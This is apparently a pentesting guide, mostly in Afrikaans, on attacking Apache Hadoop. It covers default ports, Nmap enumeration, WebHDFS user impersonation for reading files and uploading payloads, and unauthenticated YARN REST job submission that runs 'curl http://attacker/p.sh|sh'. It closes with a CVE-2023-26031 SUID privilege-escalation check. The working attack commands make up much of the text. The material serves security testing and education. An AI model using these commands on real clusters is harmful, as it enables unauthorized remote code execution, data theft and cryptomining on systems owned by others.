# 50030-50060-50070-50075-50090 - Pentesting Hadoop

{{#include ../banners/hacktricks-training.md}}

## **Basiese Inligting**

**Apache Hadoop** is 'n **open-source raamwerk** vir **gedistribueerde stoor en verwerking** van **groot datastelle** oor **rekenarklustere**. Dit gebruik **HDFS** vir stoor en **MapReduce** vir verwerking.

Nuttige standaard hawens:

- **50070 / 9870** NameNode (WebHDFS)
- **50075 / 9864** DataNode
- **50090** Secondary NameNode
- **8088** YARN ResourceManager web UI & REST
- **8042** YARN NodeManager
- **8031/8032** YARN RPC (often forgotten and still unauth in many installs)

Ongelukkig ontbreek daar by die tyd van dokumentasie ondersteuning vir Hadoop in die Metasploit-framework. Jy kan egter die volgende **Nmap-skripte** gebruik om Hadoop-dienste te enumereer:

- **`hadoop-jobtracker-info (Port 50030)`**
- **`hadoop-tasktracker-info (Port 50060)`**
- **`hadoop-namenode-info (Port 50070)`**
- **`hadoop-datanode-info (Port 50075)`**
- **`hadoop-secondary-namenode-info (Port 50090)`**

Dit is belangrik om daarop te let dat **Hadoop in sy standaardopstelling sonder outentisering werk**. Vir verbeterde sekuriteit is daar egter konfigurasies beskikbaar om Kerberos met HDFS, YARN, en MapReduce-dienste te integreer.

## WebHDFS / HttpFS misbruik (50070/9870 or 14000)

Wanneer **security=off** kan jy enige gebruiker imiteer met die `user.name`-parameter. Hier is 'n paar vinnige primitiewe:
```bash
# list root directory
curl "http://<host>:50070/webhdfs/v1/?op=LISTSTATUS&user.name=hdfs"

# read arbitrary file from HDFS
curl -L "http://<host>:50070/webhdfs/v1/etc/hadoop/core-site.xml?op=OPEN&user.name=hdfs"

# upload a web shell / binary
curl -X PUT -T ./payload "http://<host>:50070/webhdfs/v1/tmp/payload?op=CREATE&overwrite=true&user.name=hdfs" -H 'Content-Type: application/octet-stream'
```
As HttpFS geaktiveer is (standaardpoort **14000**), geld dieselfde REST-paaie. Agter Kerberos kan jy steeds `curl --negotiate -u :` met 'n geldige ticket gebruik.

## YARN unauth RCE (8088)

Die **ResourceManager REST API** aanvaar taakindienings sonder auth in die standaard “simple” modus (`dr.who`). Aanvallers misbruik dit om ewekansige opdragte (bv. miners) uit te voer sonder dat HDFS-skryftoegang benodig word.
```bash
# 1) get an application id
curl -s -X POST http://<host>:8088/ws/v1/cluster/apps/new-application

# 2) submit DistributedShell pointing to a command
curl -s -X POST http://<host>:8088/ws/v1/cluster/apps \
-H 'Content-Type: application/json' \
-d '{
"application-id":"application_1234567890000_0001",
"application-name":"pwn",
"am-container-spec":{
"commands":{"command":"/bin/bash -c \"curl http://attacker/p.sh|sh\""}
},
"application-type":"YARN"
}'
```
As port **8031/8032 RPC** blootgestel is, laat ouer clusters dieselfde job submission oor protobuf toe sonder auth (gedokumenteer in verskeie cryptominer-campagnes) – behandel daardie ports ook as RCE.

## Lokaal PrivEsc van YARN containers (CVE-2023-26031)

Hadoop 3.3.1–3.3.4 **container-executor** laai libs vanaf 'n **relative RUNPATH**. 'n Gebruiker wat YARN containers kan uitvoer (insluitend remote submitters op onveilige clusters) kan 'n kwaadwillige `libcrypto.so` in 'n skryfbare pad loslaat en **root** kry wanneer `container-executor` met SUID loop.

Vinnige kontrole:
```bash
readelf -d /opt/hadoop/bin/container-executor | grep 'RUNPATH\|RPATH'
# vulnerable if it contains $ORIGIN/:../lib/native/
ls -l /opt/hadoop/bin/container-executor   # SUID+root makes it exploitable
```
Reggestel in **3.3.5**; maak seker dat die binary nie SUID is as secure containers nie benodig word nie.

## Verwysings

- [Apache Hadoop official CVE list](https://hadoop.apache.org/cve_list.html)
- [Wiz write-up on CVE-2023-26031](https://www.wiz.io/vulnerability-database/cve/cve-2023-26031)

{{#include ../banners/hacktricks-training.md}}
